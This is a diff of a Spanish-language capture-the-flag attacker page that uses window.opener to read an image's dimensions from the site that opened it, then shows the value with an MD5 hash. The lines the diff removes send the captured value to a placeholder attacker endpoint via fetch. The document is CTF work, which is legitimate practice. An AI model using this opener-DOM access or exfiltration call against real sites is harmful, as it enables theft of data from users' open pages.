@@ -1,28 +1,29 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Sitio de captura para el CTF</title>
+    <!-- Incluir una librería para calcular MD5 en el navegador -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
+</head>
 <body>
-    <h1>Sitio de captura</h1>
+    <h1>Sitio de captura para el CTF</h1>
+    <div id="result">Esperando datos...</div>
     <script>
-        // Intentar acceder al DOM del sitio "Imagen Importante" usando window.opener
         try {
-            const img = window.opener.document.querySelector('img'); // Busca la primera imagen, ajusta el selector si es necesario
+            // Acceder al DOM del sitio "Imagen Importante" usando window.opener
+            const img = window.opener?.document.querySelector('img'); // Ajusta el selector si es necesario
             if (img) {
                 const width = img.naturalWidth;
                 const height = img.naturalHeight;
                 const level = width * height;
-                // Enviar el nivel a un endpoint en tu servidor
-                fetch('http://<tu-ip-o-ngrok>:8001/capture?level=' + level, {
-                    method: 'GET',
-                    mode: 'no-cors' // Para evitar problemas con CORS en el servidor de captura
-                }).then(() => {
-                    console.log('Nivel enviado: ' + level);
-                }).catch(err => {
-                    console.error('Error al enviar el nivel: ', err);
-                });
+                // Mostrar el nivel en la página
+                const resultDiv = document.getElementById('result');
+                resultDiv.innerHTML = `Nivel de Pepe: ${level}<br>Hash MD5: ${md5(level.toString())}`;
             } else {
-                console.log('No se encontró la imagen de Pepe');
+                document.getElementById('result').innerHTML = 'No se encontró la imagen de Pepe';
             }
         } catch (err) {
-            console.error('Error al acceder al DOM: ', err);
+            document.getElementById('result').innerHTML = `Error al acceder al DOM: ${err.message}`;
         }
     </script>
 </body>
